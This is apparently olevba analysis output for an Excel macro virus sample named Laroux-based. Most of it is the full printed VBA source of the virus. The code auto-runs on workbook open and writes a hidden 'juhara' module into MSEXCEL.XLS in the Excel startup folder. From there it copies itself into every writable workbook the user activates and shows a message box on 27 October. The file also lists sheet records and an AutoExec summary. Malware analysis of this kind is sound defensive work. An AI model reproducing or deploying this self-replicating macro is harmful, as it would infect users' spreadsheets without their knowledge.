olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-98c8564bec66ac2969525ed65f6526cbcfb9aced
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO juhara.bas 
in file: Virus.MSExcel.Laroux-based-98c8564bec66ac2969525ed65f6526cbcfb9aced - OLE stream: '_VBA_PROJECT_CUR/VBA/juhara'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    UserName$ = Application.OrganizationName
    Application.OnSheetActivate = "scan_files"
End Sub

Sub scan_files()
Attribute scan_files.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo Abort
        
    sp$ = Application.StartupPath
    msx$ = Dir(sp$ & "\" & "MSEXCEL.XLS")
    If msx$ = "MSEXCEL.XLS" Then xlsv = 1 Else xlsv = 0
    If ActiveWorkbook.Modules.Count > 0 Then wsv = 1 Else wsv = 0
    whichfile = xlsv + wsv * 10
    
Select Case whichfile
    
    Case 10
    Application.ScreenUpdating = False
    awn$ = ActiveWorkbook.Name
    Sheets("juhara").Visible = True
    Sheets("juhara").Select
    Sheets("juhara").Copy
    With ActiveWorkbook
        .Author = "El Juhara"
    End With
    newname$ = ActiveWorkbook.Name
    sp4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "MSEXCEL.XLS", FileFormat:=xlNormal, Password:="", WriteResPassword:="", ReadOnlyRecommended:=False, CreateBackup:=False
    ChDir sp4$
    Workbooks(awn$).Sheets("juhara").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "MSEXCEL.XLS!scan_files"
    
    Case 1
    'Convert file if necessary
    
    If Workbooks(ActiveWorkbook.Name).FileFormat <> xlNormal Then
        fname$ = ActiveWorkbook.Path & "\" & ActiveWorkbook.Name
        Workbooks(ActiveWorkbook.Name).SaveAs FileName:=fname$, FileFormat:=xlNormal
    End If
    
    Application.ScreenUpdating = False
    awn$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    shtname$ = Workbooks(awn$).Sheets(1).Name
    If (shtname$ <> "juhara") And (ActiveWorkbook.ReadOnly = False) Then
        ' ActiveWorkbook.Sheets.Add Type:=xlModule
        Workbooks("MSEXCEL.XLS").Sheets("juhara").Copy before:=Workbooks(awn$).Sheets(1)
        Workbooks(awn$).Sheets("juhara").Visible = False
        Workbooks(awn$).Sheets("juhara").Protect
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "MSEXCEL.XLS!scan_files"
    Case Else
End Select

'This is the Payload
If ((Day(Now) = 27) And (Month(Now) = 10)) Then
    MsgBox ("There is no avoiding war; it can only be postponed to the advantage of others")
End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  juhar
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

